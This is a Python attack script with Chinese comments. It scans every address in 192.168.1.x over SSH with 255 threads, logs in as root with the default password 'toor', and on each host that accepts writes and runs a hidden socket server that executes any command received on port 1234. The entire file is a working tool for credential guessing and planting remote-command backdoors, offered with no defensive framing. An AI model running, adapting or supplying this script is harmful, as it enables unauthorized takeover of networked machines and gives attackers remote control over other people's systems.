#-*- coding:utf-8 -*-
import paramiko
import threading
import queue
import time
#反弹shell python
q=queue.Queue()
#lock = threading.Lock()

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    return result.decode()

def main(x):
    shell = '''
    #服务器端
    import socket
    import os
    s=socket.socket()   #创建套接字 #s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)

    s.bind(('0.0.0.0',1234))    #绑定地址和端口#0.0.0.0接收任意客户端ip连接
    s.listen(5)                 #调用listen方法开始监听端口，传入的参数为等待连接的最大数量
    con,addr=s.accept()     #接受一个客户端的连接
    #print(con,addr)

    for i in range(10):
        cmd=con.recv(1024)
        print(cmd)
        command=cmd.decode()
        if command.startswith('cd'):
            os.chdir(command[2:].strip())   #切换路径
            result=os.getcwd()      #显示路径
        else:
            result=os.popen(command).read()
        if result:
            con.send(result.encode())
        else:
            con.send(b'OK!')
    '''
    cmd = 'echo \"%s\" > ./shell.py' % (shell) +'&& python3 ./shell.py'
    port = '22'
    username = 'root'
    passwd = 'toor'
    
    ip = '192.168.1.{}'.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd='id')
        if res:
            print("[ + ]Ip: %s" % ip_demo +" is success!!! [ + ]")
            #lock.release()
            ssh_base_pwd(ip_demo,port,username,passwd,cmd)
    except:
        print("[ - ]Ip: %s" % ip_demo +" is Failed")
    if x > 255:
        print("Finshed!!!!!!!!")
    q.task_done()
    
#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()

#q.join()所有任务完成